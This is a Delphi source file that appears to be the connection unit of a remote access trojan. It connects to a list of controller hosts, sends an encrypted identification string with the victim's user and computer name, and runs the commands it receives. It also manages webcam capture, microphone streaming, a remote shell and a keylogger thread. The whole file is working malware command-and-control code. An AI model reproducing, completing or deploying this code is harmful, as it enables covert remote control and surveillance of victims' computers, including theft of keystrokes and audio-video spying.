unit UnitConnection;

interface

uses
  Windows, SocketUnit, UnitConstants, UnitStringEncryption, UnitStringCompression,
  UnitConfiguration, UnitFunctions, Classes;

procedure StartConnection;
procedure SendDatas(ClientSocket: TClientSocket; Datas: string);  
procedure _SendDatas(var ClientSocket: TClientSocket; Datas: string);

implementation

uses
  UnitWebcamCapture, UnitMicrophone, UnitShell, UnitKeyboardInputs, UnitVariables,
  UnitExecuteCommands, UnitInformations;

procedure SendDatas(ClientSocket: TClientSocket; Datas: string);             
begin
  if ClientSocket.Connected = False then Exit;
  Datas := CompressString(Datas);
  Datas := EnDecryptString(Datas, PROGRAMPASSWORD);
  if ClientSocket.SendString(IntToStr(Length(Datas)) + '|' + #10) <= 0 then Exit;
  ClientSocket.SendBuffer(Pointer(Datas)^, Length(Datas));
end;    
  
procedure _SendDatas(var ClientSocket: TClientSocket; Datas: string);
begin
  ClientSocket := TClientSocket.Create;
  ClientSocket.Connect(MainHost, MainPort);
  Sleep(10);
  if ClientSocket.Connected = False then Exit;
  Datas := _Password + '|' + CLIENTNEW + '|' + NewIdentification +
           '^(' + GetUser + '@' + GetComputer + ')' + '|' + Datas;
  Datas := CompressString(Datas);
  Datas := EnDecryptString(Datas, PROGRAMPASSWORD);
  if ClientSocket.SendString(IntToStr(Length(Datas)) + '|' + #10) <= 0 then Exit;
  ClientSocket.SendBuffer(Pointer(Datas)^, Length(Datas));
end;    

function ReceiveDatas(ClientSocket: TClientSocket): string;
begin
  Result := '';
  if ClientSocket.Connected = False then Exit;
  Result := ClientSocket.ReceiveString;

  if (Length(Result) >= 1) and ((Result[1] = #32) or (Result[1] = #13) or (Result[1] = #10)) then Delete(Result, 1, 1);
  if (Length(Result) >= 1) and ((Result[1] = #32) or (Result[1] = #13) or (Result[1] = #10)) then Delete(Result, 1, 1);
  if (Length(Result) >= 1) and ((Result[1] = #32) or (Result[1] = #13) or (Result[1] = #10)) then Delete(Result, 1, 1);

  Result := EnDecryptString(Result, PROGRAMPASSWORD);
  Result := DecompressString(Result);
end;

procedure StartConnection;
var
  MainDatas: string;
  i: Integer;
begin
  i := 0;

  while True do
  begin
    MainConnection := TClientSocket.Create;

    if i > High(_Hosts) then i := 0;
    if (_Hosts[i] <> '') and (_Ports[i] <> 0) then
    begin
      MainHost := _Hosts[i];
      MainPort := _Ports[i];
      MainConnection.Connect(MainHost, MainPort);
      Sleep(10);

      if MainConnection.Connected = True then
      begin
        SendDatas(MainConnection, _Password + '|');

        while MainConnection.Connected = True do
        begin
          MainConnection.Idle(0);
          MainDatas := ReceiveDatas(MainConnection);
          if MainDatas <> '' then ExecuteCommands(MainDatas);
          ProcessMessages;
        end;

        ShellCmd := 'exit';

        if SendWebcamImg = True then
        begin
          SendWebcamImg := False;
          WebcamThread.Free;
        end;

        if AudioThread <> nil then
        begin
          AudioThread.StopStreaming;
          AudioThread.Free;
        end;

        if KeyloggerThread <> 0 then CloseThread(KeyloggerThread);
      end;
    end;
          
    Inc(i);
    ProcessMessages;

    MainConnection.Destroy;
    MainConnection := nil;

    Sleep(_Delay);
  end;
end;

end.
